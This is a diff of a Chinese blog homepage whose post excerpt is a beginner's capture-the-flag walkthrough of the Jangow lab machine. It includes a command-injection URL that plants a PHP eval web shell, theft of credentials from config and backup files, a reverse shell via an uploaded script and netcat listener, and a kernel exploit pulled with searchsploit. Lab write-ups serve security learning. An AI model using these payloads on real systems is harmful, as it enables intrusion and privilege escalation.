@@ -31,25 +31,25 @@ var CONFIG = {
   sourcePath: {"js":"js","css":"css","images":"images"},
 };
 
-window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Welcome to cyny666's world</div><div class="header-banner-info__subtitle">A world with code and failure</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/12/21/jangow/">My New Post</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-12-21</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-12-21</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>第一次做靶机渗透（很好玩，下次还来）</p>
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Welcome to cyny666's world</div><div class="header-banner-info__subtitle">A world with code and failure</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/12/21/jangow/">Jangow</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-12-21</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-12-21</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>第一次做靶机渗透（很好玩，下次还来）</p>
 <p>先用virtual box打开靶机 </p>
-<p><img src="/./assets/image-20231204163322628.png" alt="image-20231204163322628"></p>
+<p><img src="https://notes.sjtu.edu.cn/uploads/upload_fa798e6bd97e3637bce941c1e8d19891.png"></p>
 <p>然后获取了ip，开始渗透测试！</p>
 <p>先用kali中的nmap扫一下该ip的端口</p>
-<p><img src="/./assets/image-20231204163337702.png" alt="image-20231204163337702"></p>
+<p><img src="https://notes.sjtu.edu.cn/uploads/upload_ff393abe9c4fa493419daed3e255fe13.png"></p>
 <p>发现开了两个端口21的ftp和80的http</p>
 <p>先去看80服务然后发现有一个任意命令执行漏洞</p>
-<p><img src="/./assets/image-20231204163437532.png" alt="image-20231204163437532"></p>
+<p><img src="https://notes.sjtu.edu.cn/uploads/upload_c5eae20bbd0c6fee9e57542d7bbc45a3.png"></p>
 <p>然后开写一句话木马（靶机渗透是不是都去写一句话木马啊)感觉靶机都是RCE</p>
 <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://192.168.56.118/site/busque.php?buscar=echo" >http://192.168.56.118/site/busque.php?buscar=echo</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> ‘&lt;?php eval($_POST[“shell”]);’ &gt; shell.php</p>
 <p>然后即可用蚁剑连接获取权限</p>
-<p><img src="/./assets/image-20231204163911055.png" alt="image-20231204163911055"></p>
+<p><img src="https://notes.sjtu.edu.cn/uploads/upload_cad1050e7602279dcc8fbf83b6a3256e.png"></p>
 <p>然后在里面开始信息收集</p>
 <p>可以在桌面发现user.txt里面有第一个flag</p>
 <p>先在WordPress里面找到config.php</p>
-<p><img src="/./assets/image-20231204164023069.png" alt="image-20231204164023069"></p>
+<p><img src="https://notes.sjtu.edu.cn/uploads/upload_f1a52e519414da785b759aaf05a47f69.png"></p>
 <p>又找到一个.backup文件然后发现账号密码</p>
-<p><img src="/./assets/image-20231204164328956.png" alt="image-20231204164328956"></p>
+<p><img src="https://notes.sjtu.edu.cn/uploads/upload_1c812d273643bac43e2ab203433eb16c.png"></p>
 <p>可以用ftp连接（这里有一点信息泄露）</p>
 <p>然后反弹shell</p>
 <p>上传j.sh</p>
@@ -58,10 +58,10 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></he
 <p>用蚁剑执行bash j.sh</p>
 <p>这里用window的nc -lvvp 443了，貌似需要一个内网下的反弹才可以</p>
 <p>然后</p>
-<p><img src="/./assets/image-20231204165735652.png" alt="image-20231204165735652"></p>
+<p><img src="https://notes.sjtu.edu.cn/uploads/upload_0b4f740b9fcb659a70a684576dfb68fa.png"></p>
 <p>然后发现这个版本为uname -a Ubuntu4.4.0-31</p>
 <p>然后kali上searchsploit ubuntu 4.4.0-31</p>
-<p><img src="/./assets/image-20231204165932119.png" alt="image-20231204165932119"></p>
+<p><img src="https://notes.sjtu.edu.cn/uploads/upload_17c6646972f31e84dc3d7f64c380c323.png"></p>
 <p>然后下载下来searchsploit -m 45010</p>
 <p>然后上传到蚁剑</p>
 <p>windows那边然后先打开一个模拟终端</p>
